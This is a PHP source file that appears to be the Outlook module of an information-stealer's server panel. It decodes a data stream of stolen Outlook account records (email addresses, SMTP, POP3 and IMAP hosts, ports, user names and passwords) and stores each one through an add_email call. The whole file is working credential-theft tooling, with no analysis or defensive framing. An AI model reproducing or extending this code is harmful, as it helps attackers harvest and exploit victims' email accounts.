<?php
class Module_outlook extends Module_
{
    private function GetPassStream(&$Stream)
    {
        $Type = $Stream->getDWORD();
        if($Type == 1)
        {

        }
        else if($Type == 2)
		{
			return $Stream->getSTRING_();
		}
            

        return '';
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $stream = new Stream($Data, strlen($Data));
            while(TRUE)
            {
                $Email = $stream->getSTRING_(); //
                if($Email == NULL)
                    break;

                $SMTPEmail	= $stream->getSTRING_(); //
                $SMTPHost 	= $stream->getSTRING_(); //
                $SMTPUserN	= $stream->getSTRING_(); //
                $SMTPUser	= $stream->getSTRING_(); //

                $POPHost	= $stream->getSTRING_();
                $POPUserN 	= $stream->getSTRING_();
                $POPUser	= $stream->getSTRING_();
				
                $NNTPEmail	= $stream->getSTRING_(); //
                $NNTPUserN 	= $stream->getSTRING_();
                $NNTPHost	= $stream->getSTRING_();
				
                $IMAPHost	= $stream->getSTRING_();
                $IMAPUserN 	= $stream->getSTRING_();
                $IMAPUser	= $stream->getSTRING_();

                $HTTPUser	= $stream->getSTRING_();
                $HTTPHostU 	= $stream->getSTRING_();
                $HTTPUserN	= $stream->getSTRING_();
                $HTTPHost 	= $stream->getSTRING_();

                $POPPort 	= $stream->getDWORD();
                $SMTPPort 	= $stream->getDWORD();
                $IMAPPort 	= $stream->getDWORD();

                $POPPass2	= $this->GetPassStream($stream);
                $IMAPPass2 	= $this->GetPassStream($stream);
                $NNTPPass2	= $this->GetPassStream($stream);
                $HTTPMAilP2	= $this->GetPassStream($stream);
                $SMTPPass2 	= $this->GetPassStream($stream); //

                $POPPass	= $this->GetPassStream($stream);
                $IMAPPass 	= $this->GetPassStream($stream);
                $NNTPPass	= $this->GetPassStream($stream);
                $HTTPPass	= $this->GetPassStream($stream);
                $SMTPPass 	= $this->GetPassStream($stream); //
				
                $Email_ = $SMTPEmail;
                if (!strlen($Email_))
				{
					$Email_ = $Email;
					if (!strlen($Email_))
						$Email_ = $NNTPEmail;
				}                

                $SMTPUser_  = $SMTPUserN;
                if (!strlen($SMTPUser_))
                    $SMTPUser_ = $SMTPUser;
				
                $SMTPPass_ = $SMTPPass;
                if (!strlen($SMTPPass_))
                    $SMTPPass_ = $SMTPPass2;

                $POPUser_ = $POPUserN;
                if (!strlen($POPUser_))
                    $POPUser_ = $POPUser;
				
                $POPPass_ = $POPPass;
                if (!strlen($POPPass_))
                    $POPPass_ = $POPPass2;
				
                $IMAPUser_ = $IMAPUserN;
                if (!strlen($IMAPUser_))
                    $IMAPUser_ = $IMAPUserN;
				
                $IMAPPass_ = $IMAPPass;
                if (!strlen($IMAPPass_))
                    $IMAPPass_ = $IMAPPass2;

                if (!strlen($SMTPUser_) && !strlen($SMTPPass_) && strlen($POPUser_) && strlen($POPPass_))
                    $this->add_email($Email_, 'smtp', $SMTPHost, $SMTPPort, $POPUser_, $POPPass_);
				
                if (!strlen($SMTPUser_) && !strlen($SMTPPass_) && strlen($IMAPUser_) && strlen($IMAPPass_))
                    $this->add_email($Email_, 'smtp', $SMTPHost, $SMTPPort, $IMAPUser_, $IMAPPass_);
				
                $this->add_email($Email_, 'smtp', $SMTPHost, $SMTPPort, $SMTPUser_, $SMTPPass_);
                $this->add_email($Email_, 'pop3', $POPHost, $POPPort, $POPUser_, $POPPass_);
                $this->add_email($Email_, 'imap', $IMAPHost, $IMAPPort, $IMAPUser_, $IMAPPass_);
            }

            $stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

